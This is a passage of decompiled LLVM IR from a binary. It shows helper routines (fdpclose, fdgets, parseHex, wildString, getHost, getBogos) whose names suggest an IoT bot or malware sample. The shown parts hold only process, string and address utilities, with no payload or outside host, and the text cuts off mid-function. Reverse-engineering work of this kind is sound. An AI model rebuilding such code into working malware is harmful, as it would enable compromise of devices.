  br i1 %v3_100013e8, label %dec_label_pc_10001418, label %dec_label_pc_100014c8

dec_label_pc_100013f4:                            ; preds = %dec_label_pc_100013c0
  %v3_100013f4 = load i32, i32* %stack_var_-48, align 4
  store i32 268440576, i32* @lr, align 4
  %v1_100013fc = call i32 @__libc_close(i32 %v3_100013f4)
  store i32 ptrtoint (i32* @global_var_1000140c.17 to i32), i32* @lr, align 4
  %v1_10001408 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001530

dec_label_pc_10001418:                            ; preds = %dec_label_pc_100013e4
  %v3_1000141c = load i8, i8* %arg2, align 1
  %v3_10001424 = icmp eq i8 %v3_1000141c, 114
  br i1 %v3_10001424, label %dec_label_pc_1000142c, label %dec_label_pc_10001464

dec_label_pc_1000142c:                            ; preds = %dec_label_pc_10001418
  %v3_10001430 = icmp eq i32 %tmp3, 1
  br i1 %v3_10001430, label %dec_label_pc_10001454, label %dec_label_pc_10001438

dec_label_pc_10001438:                            ; preds = %dec_label_pc_1000142c
  store i32 268440648, i32* @lr, align 4
  %v4_10001444 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268440660, i32* @lr, align 4
  %v1_10001450 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001454

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c, %dec_label_pc_10001438
  %v3_10001454 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001460.18 to i32), i32* @lr, align 4
  %v1_1000145c = call i32 @__libc_close(i32 %v3_10001454)
  br label %dec_label_pc_10001498

dec_label_pc_10001464:                            ; preds = %dec_label_pc_10001418
  %v3_10001464 = load i32, i32* %stack_var_-48, align 4
  %v3_10001468 = icmp eq i32 %v3_10001464, 0
  br i1 %v3_10001468, label %dec_label_pc_1000148c, label %dec_label_pc_10001470

dec_label_pc_10001470:                            ; preds = %dec_label_pc_10001464
  store i32 268440704, i32* @lr, align 4
  %v4_1000147c = call i32 @dup2(i32 %v3_10001464, i32 0, i32 %tmp)
  %v3_10001480 = load i32, i32* %stack_var_-48, align 4
  store i32 268440716, i32* @lr, align 4
  %v1_10001488 = call i32 @__libc_close(i32 %v3_10001480)
  br label %dec_label_pc_1000148c

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_10001464, %dec_label_pc_10001470
  store i32 268440728, i32* @lr, align 4
  %v1_10001494 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001498

dec_label_pc_10001498:                            ; preds = %dec_label_pc_10001454, %dec_label_pc_1000148c
  %v8_100014bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_100160ec.19 to i32), i32 ptrtoint ([3 x i8]* @global_var_100160f4.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_100160f8.21 to i32), i32 %arg1, i32 0)
  %v1_100014c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100014c8

dec_label_pc_100014c8:                            ; preds = %dec_label_pc_100013e4, %dec_label_pc_10001498
  %v2_100014cc = load i8, i8* %arg2, align 1
  %v3_100014d4 = icmp eq i8 %v2_100014cc, 114
  %v3_100014dc = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_100014d4, label %dec_label_pc_100014dc, label %dec_label_pc_100014f4

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c8
  store i32 ptrtoint (i32* @global_var_100014f0.23 to i32), i32* @lr, align 4
  %v1_100014ec = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001508

dec_label_pc_100014f4:                            ; preds = %dec_label_pc_100014c8
  store i32 268440840, i32* @lr, align 4
  %v1_10001504 = call i32 @__libc_close(i32 %v3_100014dc)
  br label %dec_label_pc_10001508

dec_label_pc_10001508:                            ; preds = %dec_label_pc_100014dc, %dec_label_pc_100014f4
  %stack_var_-36.0 = phi i32 [ %v3_100014dc, %dec_label_pc_100014dc ], [ %tmp3, %dec_label_pc_100014f4 ]
  %v1_1000150c = mul i32 %stack_var_-36.0, 4
  %v3_10001518 = load i32, i32* @global_var_1002c900.15, align 4
  %v2_1000151c = add i32 %v3_10001518, %v1_1000150c
  %v2_10001524 = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_100013c0, i32* %v2_10001524, align 4
  br label %dec_label_pc_10001530

dec_label_pc_10001530:                            ; preds = %dec_label_pc_100013f4, %dec_label_pc_10001390, %dec_label_pc_10001358, %dec_label_pc_10001324, %dec_label_pc_10001300, %dec_label_pc_10001508
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001390 ], [ -1, %dec_label_pc_100013f4 ], [ %stack_var_-36.0, %dec_label_pc_10001508 ], [ -1, %dec_label_pc_10001358 ], [ -1, %dec_label_pc_10001324 ], [ -1, %dec_label_pc_10001300 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_100014dc, { 1, 0 }
  uselistorder i32 %v1_10001368, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001530, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001508, { 1, 0 }
  uselistorder label %dec_label_pc_100014c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001498, { 1, 0 }
  uselistorder label %dec_label_pc_1000148c, { 1, 0 }
  uselistorder label %dec_label_pc_10001454, { 1, 0 }
  uselistorder label %dec_label_pc_100013c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001300, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_1000156c = load i32, i32* @global_var_1002c900.15, align 4
  %v3_10001570 = icmp eq i32 %v3_1000156c, 0
  br i1 %v3_10001570, label %dec_label_pc_1000159c, label %dec_label_pc_10001578

dec_label_pc_10001578:                            ; preds = %entry
  %v1_1000157c = mul i32 %arg1, 4
  %v2_1000158c = add i32 %v3_1000156c, %v1_1000157c
  %v1_10001590 = inttoptr i32 %v2_1000158c to i32*
  %v2_10001590 = load i32, i32* %v1_10001590, align 4
  %v3_10001594 = icmp eq i32 %v2_10001590, 0
  br i1 %v3_10001594, label %dec_label_pc_1000159c, label %dec_label_pc_100015a8

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001578, %entry
  br label %dec_label_pc_100016d0

dec_label_pc_100015a8:                            ; preds = %dec_label_pc_10001578
  store i32 268441008, i32* @lr, align 4
  %v1_100015ac = call i32 @__libc_close(i32 %arg1)
  %v2_100015b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441020, i32* @lr, align 4
  %v1_100015b8 = call i32 @sigemptyset(i32 %v2_100015b0)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441036, i32* @lr, align 4
  %v2_100015c8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 2)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441052, i32* @lr, align 4
  %v2_100015d8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 3)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441068, i32* @lr, align 4
  %v2_100015e8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 1)
  %v2_100015f0 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441092, i32* @lr, align 4
  %v3_10001600 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_100015b0, i32 %v2_100015f0)
  %v2_10001620 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_100015a8
  %v3_10001614 = load i32, i32* @global_var_1002c900.15, align 4
  %v2_10001618 = add i32 %v3_10001614, %v1_1000157c
  %v1_1000161c = inttoptr i32 %v2_10001618 to i32*
  %v2_1000161c = load i32, i32* %v1_1000161c, align 4
  store i32 268441140, i32* @lr, align 4
  %v3_10001630 = call i32 @__libc_waitpid(i32 %v2_1000161c, i32 %v2_10001620, i32 0)
  %v4_10001644 = icmp eq i32 %v3_10001630, -1
  br i1 %v4_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001660

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001604
  %v0_1000164c = call i32 @__errno_location()
  %v1_10001654 = inttoptr i32 %v0_1000164c to i32*
  %v2_10001654 = load i32, i32* %v1_10001654, align 4
  %v3_10001658 = icmp eq i32 %v2_10001654, 4
  br i1 %v3_10001658, label %dec_label_pc_10001604, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001604, %dec_label_pc_1000164c
  %v4_10001644.lcssa = phi i1 [ false, %dec_label_pc_10001604 ], [ true, %dec_label_pc_1000164c ]
  store i32 268441204, i32* @lr, align 4
  %v3_10001670 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100015f0, i32 0)
  %v1_10001678 = mul i32 %tmp5, 4
  %v3_10001684 = load i32, i32* @global_var_1002c900.15, align 4
  %v2_10001688 = add i32 %v3_10001684, %v1_10001678
  %v2_10001690 = inttoptr i32 %v2_10001688 to i32*
  store i32 0, i32* %v2_10001690, align 4
  br i1 %v4_10001644.lcssa, label %dec_label_pc_100016c8, label %dec_label_pc_100016a4

dec_label_pc_100016a4:                            ; preds = %dec_label_pc_10001660
  %v3_100016a4 = load i32, i32* %stack_var_-52, align 4
  %v1_100016b0 = call i32 @__asm_rlwinm(i32 %v3_100016a4, i32 0, i32 16, i32 23)
  %v4_100016b4 = sdiv i32 %v1_100016b0, 256
  br label %dec_label_pc_100016c8

dec_label_pc_100016c8:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_100016a4
  %storemerge2 = phi i32 [ %v4_100016b4, %dec_label_pc_100016a4 ], [ -1, %dec_label_pc_10001660 ]
  br label %dec_label_pc_100016d0

dec_label_pc_100016d0:                            ; preds = %dec_label_pc_1000159c, %dec_label_pc_100016c8
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_100016c8 ], [ -1, %dec_label_pc_1000159c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_100015b0, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_1000157c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100016d0, { 1, 0 }
  uselistorder label %dec_label_pc_100016c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001660, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001764

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001774
  store i32 268441412, i32* @lr, align 4
  %v1_10001740 = call i32 @__libc_read(i32 %arg3)
  %v1_10001750 = add nuw i32 %storemerge25, 1
  %v3_1000175c = icmp eq i32 %v1_10001740, 1
  br i1 %v3_1000175c, label %dec_label_pc_10001764, label %dec_label_pc_10001798

dec_label_pc_10001764:                            ; preds = %entry, %dec_label_pc_10001724
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001750, %dec_label_pc_10001724 ]
  %v2_1000176c = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_1000176c, label %dec_label_pc_10001774, label %dec_label_pc_10001798

dec_label_pc_10001774:                            ; preds = %dec_label_pc_10001764
  %v2_10001780 = add i32 %storemerge25, %arg1
  %v1_10001784 = add i32 %v2_10001780, -1
  %v1_10001788 = inttoptr i32 %v1_10001784 to i8*
  %v2_10001788 = load i8, i8* %v1_10001788, align 1
  %v3_10001790 = icmp eq i8 %v2_10001788, 10
  br i1 %v3_10001790, label %dec_label_pc_10001798, label %dec_label_pc_10001724

dec_label_pc_10001798:                            ; preds = %dec_label_pc_10001774, %dec_label_pc_10001764, %dec_label_pc_10001724
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001774 ], [ 1, %dec_label_pc_10001764 ], [ %v1_10001740, %dec_label_pc_10001724 ]
  %v3_1000179c = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_1000179c, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001764, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100018342 = load i8, i8* %arg1, align 1
  %v3_1000183c5 = icmp eq i8 %v2_100018342, 0
  br i1 %v3_1000183c5, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_10001844
  %v1_100017f8 = mul i32 %stack_var_-40.06, 16
  %v2_10001800 = load i8, i8* %stack_var_-24.07, align 1
  %v3_10001800 = zext i8 %v2_10001800 to i32
  %v1_10001810 = mul nuw nsw i32 %v3_10001800, 4
  %v2_10001814 = add i32 %v1_10001810, ptrtoint (i32* @global_var_100160fc.24 to i32)
  %v1_10001818 = inttoptr i32 %v2_10001814 to i32*
  %v2_10001818 = load i32, i32* %v1_10001818, align 4
  %v2_1000181c = or i32 %v2_10001818, %v1_100017f8
  %v1_10001828 = add i32 %v4_100018308, 1
  %v5_1000182c = inttoptr i32 %v1_10001828 to i8*
  %v2_10001834 = load i8, i8* %v5_1000182c, align 1
  %v3_1000183c = icmp eq i8 %v2_10001834, 0
  br i1 %v3_1000183c, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %entry, %dec_label_pc_100017f4
  %v4_100018308 = phi i32 [ %v1_10001828, %dec_label_pc_100017f4 ], [ %tmp, %entry ]
  %stack_var_-24.07 = phi i8* [ %v5_1000182c, %dec_label_pc_100017f4 ], [ %arg1, %entry ]
  %stack_var_-40.06 = phi i32 [ %v2_1000181c, %dec_label_pc_100017f4 ], [ 0, %entry ]
  %tmp16 = icmp sgt i32 %stack_var_-40.06, -1
  br i1 %tmp16, label %dec_label_pc_100017f4, label %dec_label_pc_10001850

dec_label_pc_10001850:                            ; preds = %dec_label_pc_100017f4, %dec_label_pc_10001844, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_1000181c, %dec_label_pc_100017f4 ], [ %stack_var_-40.06, %dec_label_pc_10001844 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.06, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001844, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %v2_1000188c = load i8, i8* %arg1, align 1
  %v3_1000189c = icmp eq i8 %v2_1000188c, 42
  br i1 %v3_1000189c, label %dec_label_pc_100018d4, label %dec_label_pc_100018a4

dec_label_pc_100018a4:                            ; preds = %entry
  %v3_100018a8 = icmp eq i8 %v2_1000188c, 63
  br i1 %v3_100018a8, label %dec_label_pc_10001948, label %dec_label_pc_100018b0

dec_label_pc_100018b0:                            ; preds = %dec_label_pc_100018a4
  %v3_100018b4 = icmp eq i8 %v2_1000188c, 0
  br i1 %v3_100018b4, label %dec_label_pc_100018c0, label %dec_label_pc_100019a4

dec_label_pc_100018c0:                            ; preds = %dec_label_pc_100018b0
  %v2_100018c4 = load i8, i8* %tmp, align 1
  %v3_100018c4 = zext i8 %v2_100018c4 to i32
  br label %dec_label_pc_10001a28

dec_label_pc_100018d4:                            ; preds = %entry
  %v2_100018d8 = add i32 %tmp9, 1
  store i32 268441832, i32* @lr, align 4
  %v5_100018e4 = inttoptr i32 %v2_100018d8 to i8*
  %v6_100018e4 = call i32 @wildString(i8* %v5_100018e4, i32 %arg2, i32 %tmp9)
  %v3_100018ec = icmp eq i32 %v6_100018e4, 0
  br i1 %v3_100018ec, label %dec_label_pc_10001934, label %dec_label_pc_100018f4

dec_label_pc_100018f4:                            ; preds = %dec_label_pc_100018d4
  %v2_100018f8 = load i8, i8* %tmp, align 1
  %v3_10001900 = icmp eq i8 %v2_100018f8, 0
  br i1 %v3_10001900, label %dec_label_pc_1000193c, label %dec_label_pc_10001908

dec_label_pc_10001908:                            ; preds = %dec_label_pc_100018f4
  %v2_1000190c = add i32 %arg2, 1
  store i32 268441884, i32* @lr, align 4
  %v6_10001918 = call i32 @wildString(i8* nonnull %arg1, i32 %v2_1000190c, i32 %arg2)
  %v3_10001920 = icmp eq i32 %v6_10001918, 0
  br i1 %v3_10001920, label %dec_label_pc_10001934, label %dec_label_pc_1000193c

dec_label_pc_10001934:                            ; preds = %dec_label_pc_10001908, %dec_label_pc_100018d4
  br label %dec_label_pc_1000193c

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_100018f4, %dec_label_pc_10001908, %dec_label_pc_10001934
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10001934 ], [ 1, %dec_label_pc_10001908 ], [ 1, %dec_label_pc_100018f4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001948:                            ; preds = %dec_label_pc_100018a4
  %v2_1000194c = load i8, i8* %tmp, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 0
  br i1 %v3_10001954, label %dec_label_pc_10001998, label %dec_label_pc_1000195c

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948
  %v1_10001960 = add i32 %tmp9, 1
  %v2_10001968 = add i32 %arg2, 1
  store i32 268441976, i32* @lr, align 4
  %v4_10001974 = inttoptr i32 %v1_10001960 to i8*
  %v5_10001974 = call i32 @wildString(i8* %v4_10001974, i32 %v2_10001968, i32 %arg2)
  %v3_1000197c = icmp ne i32 %v5_10001974, 0
  %. = zext i1 %v3_1000197c to i32
  br label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_1000195c, %dec_label_pc_10001948
  %storemerge3 = phi i32 [ 1, %dec_label_pc_10001948 ], [ %., %dec_label_pc_1000195c ]
  br label %dec_label_pc_10001a28

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_100018b0
  %v3_100019a8 = load i8, i8* %arg1, align 1
  %v4_100019a8 = zext i8 %v3_100019a8 to i32
  store i32 268442044, i32* @lr, align 4
  %v3_100019b8 = call i32 @__GI_toupper(i32 %v4_100019a8, i32 %tmp9)
  %v3_100019c4 = load i8, i8* %tmp, align 1
  %v4_100019c4 = zext i8 %v3_100019c4 to i32
  store i32 268442072, i32* @lr, align 4
  %v3_100019d4 = call i32 @__GI_toupper(i32 %v4_100019c4, i32 %arg2)
  %v4_100019dc = icmp eq i32 %v3_100019b8, %v3_100019d4
  br i1 %v4_100019dc, label %dec_label_pc_100019e4, label %dec_label_pc_10001a20

dec_label_pc_100019e4:                            ; preds = %dec_label_pc_100019a4
  %v1_100019e8 = add i32 %tmp9, 1
  %v2_100019f0 = add i32 %arg2, 1
  store i32 268442112, i32* @lr, align 4
  %v4_100019fc = inttoptr i32 %v1_100019e8 to i8*
  %v5_100019fc = call i32 @wildString(i8* %v4_100019fc, i32 %v2_100019f0, i32 %arg2)
  %v3_10001a04 = icmp ne i32 %v5_100019fc, 0
  %.8 = zext i1 %v3_10001a04 to i32
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_100019e4, %dec_label_pc_100019a4
  %storemerge = phi i32 [ 1, %dec_label_pc_100019a4 ], [ %.8, %dec_label_pc_100019e4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %dec_label_pc_10001998, %dec_label_pc_1000193c, %dec_label_pc_100018c0, %dec_label_pc_10001a20
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_1000193c ], [ %storemerge3, %dec_label_pc_10001998 ], [ %v3_100018c4, %dec_label_pc_100018c0 ], [ %storemerge, %dec_label_pc_10001a20 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001a28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000193c, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001a70, i32* %arg2, align 4
  %v4_10001a8c = icmp eq i32 %v1_10001a70, -1
  %. = zext i1 %v4_10001a8c to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001b1c3 = load i8, i8* %arg1, align 1
  %v3_10001b246 = icmp eq i8 %v2_10001b1c3, 0
  br i1 %v3_10001b246, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %entry, %dec_label_pc_10001ae4
  %storemerge8 = phi i8* [ %storemerge, %dec_label_pc_10001ae4 ], [ %arg1, %entry ]
  %storemerge.in7 = phi i32 [ %v1_10001b10, %dec_label_pc_10001ae4 ], [ %tmp, %entry ]
  %v3_10001ae8 = load i8, i8* %storemerge8, align 1
  %v4_10001ae8 = zext i8 %v3_10001ae8 to i32
  store i32 %v4_10001ae8, i32* %r3.global-to-local, align 4
  store i32 268442364, i32* @lr, align 4
  %v3_10001af8 = call i32 @__GI_toupper(i32 %v4_10001ae8, i32 %storemerge.in7)
  store i32 %v3_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001b08 = trunc i32 %v3_10001af8 to i8
  store i8 %v1_10001b08, i8* %storemerge8, align 1
  %v1_10001b10 = add i32 %storemerge.in7, 1
  %storemerge = inttoptr i32 %v1_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %storemerge, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, label %dec_label_pc_10001ae4

dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v0_10001b40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001b2c

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, %entry
  %v0_10001b40 = phi i32 [ %v0_10001b40.pre, %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001b40

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001b10, { 1, 0 }
  uselistorder i32 %storemerge.in7, { 1, 0 }
  uselistorder i8* %storemerge8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 268442480, i32* @lr, align 4
  %v3_10001b6c = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_100164fc.25 to i32), i32 0)
  %v2_10001d0c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_10001b84 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_10001d0c

dec_label_pc_10001b7c:                            ; preds = %dec_label_pc_10001d0c
  store i32 268442504, i32* @lr, align 4
  %v2_10001b84 = call i32 @uppercase(i8* %v1_10001b84)
  store i32 268442524, i32* @lr, align 4
  %v5_10001b98 = call i32 @strstr(i32 %v2_10001d0c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1001650c.26, i32 0, i32 0), i32 268500992)
  %v4_10001ba8 = icmp eq i32 %v5_10001b98, %v2_10001d0c
  br i1 %v4_10001ba8, label %dec_label_pc_10001bb0, label %dec_label_pc_10001cf4

dec_label_pc_10001bb0:                            ; preds = %dec_label_pc_10001b7c
  %tmp15 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bc0:                            ; preds = %dec_label_pc_10001bf4, %dec_label_pc_10001be0, %dec_label_pc_10001bcc
  %v1_10001bc4 = add i32 %v4_10001bcc, 1
  %v5_10001bc8 = inttoptr i32 %v1_10001bc4 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bcc:                            ; preds = %dec_label_pc_10001bb0, %dec_label_pc_10001bc0
  %storemerge2 = phi i8* [ %v5_10001bc8, %dec_label_pc_10001bc0 ], [ %tmp15, %dec_label_pc_10001bb0 ]
  %v4_10001bcc = ptrtoint i8* %storemerge2 to i32
  %v2_10001bd0 = load i8, i8* %storemerge2, align 1
  %v3_10001bd8 = icmp eq i8 %v2_10001bd0, 32
  br i1 %v3_10001bd8, label %dec_label_pc_10001bc0, label %dec_label_pc_10001be0

dec_label_pc_10001be0:                            ; preds = %dec_label_pc_10001bcc
  %v2_10001be4 = load i8, i8* %storemerge2, align 1
  %v3_10001bec = icmp eq i8 %v2_10001be4, 9
  br i1 %v3_10001bec, label %dec_label_pc_10001bc0, label %dec_label_pc_10001bf4

dec_label_pc_10001bf4:                            ; preds = %dec_label_pc_10001be0
  %v2_10001bf8 = load i8, i8* %storemerge2, align 1
  %v3_10001c00 = icmp eq i8 %v2_10001bf8, 58
  br i1 %v3_10001c00, label %dec_label_pc_10001bc0, label %dec_label_pc_10001c34.preheader

dec_label_pc_10001c34.preheader:                  ; preds = %dec_label_pc_10001bf4
  %v2_10001c4c = add i32 %v4_10001bcc, -1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c0c:                            ; preds = %dec_label_pc_10001c64, %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c14 = call i32 @__GI_strlen()
  %v1_10001c28 = add i32 %v0_10001c14, %v2_10001c4c
  %v3_10001c30 = inttoptr i32 %v1_10001c28 to i8*
  store i8 0, i8* %v3_10001c30, align 1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c34:                            ; preds = %dec_label_pc_10001c34.preheader, %dec_label_pc_10001c0c
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c3c = call i32 @__GI_strlen()
  %v1_10001c50 = add i32 %v0_10001c3c, %v2_10001c4c
  %v1_10001c54 = inttoptr i32 %v1_10001c50 to i8*
  %v2_10001c54 = load i8, i8* %v1_10001c54, align 1
  %v3_10001c5c = icmp eq i8 %v2_10001c54, 13
  br i1 %v3_10001c5c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c64

dec_label_pc_10001c64:                            ; preds = %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c6c = call i32 @__GI_strlen()
  %v1_10001c80 = add i32 %v0_10001c6c, %v2_10001c4c
  %v1_10001c84 = inttoptr i32 %v1_10001c80 to i8*
  %v2_10001c84 = load i8, i8* %v1_10001c84, align 1
  %v3_10001c8c = icmp eq i8 %v2_10001c84, 10
  br i1 %v3_10001c8c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c64
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442788, i32* @lr, align 4
  %v2_10001ca0 = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001ca8 = icmp eq i32 %v2_10001ca0, 0
  br i1 %v3_10001ca8, label %dec_label_pc_10001ccc, label %dec_label_pc_10001cb0

dec_label_pc_10001cb0:                            ; preds = %dec_label_pc_10001c94
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442816, i32* @lr, align 4
  %v2_10001cbc = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001cc8 = inttoptr i32 %v2_10001cbc to i8*
  store i8 0, i8* %v3_10001cc8, align 1
  br label %dec_label_pc_10001ccc

dec_label_pc_10001ccc:                            ; preds = %dec_label_pc_10001c94, %dec_label_pc_10001cb0
  %v3_10001cdc = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  store i32 ptrtoint (i32* @global_var_10001ce8.27 to i32), i32* @lr, align 4
  %v1_10001ce4 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001cf4:                            ; preds = %dec_label_pc_10001b7c
  store i32 268442892, i32* @lr, align 4
  %v3_10001d08 = call i32 @__GI_memset(i32 %v2_10001d0c, i32 0, i32 4096)
  br label %dec_label_pc_10001d0c

dec_label_pc_10001d0c:                            ; preds = %entry, %dec_label_pc_10001cf4
  %v3_10001d1c = call i32 @fdgets(i32 %v2_10001d0c, i32 4096, i32 %v3_10001b6c)
  %v3_10001d24 = icmp eq i32 %v3_10001d1c, 0
  br i1 %v3_10001d24, label %dec_label_pc_10001d2c, label %dec_label_pc_10001b7c

dec_label_pc_10001d2c:                            ; preds = %dec_label_pc_10001d0c
  store i32 ptrtoint (i32* @global_var_10001d34.28 to i32), i32* @lr, align 4
  %v1_10001d30 = call i32 @__libc_close(i32 %v3_10001b6c)
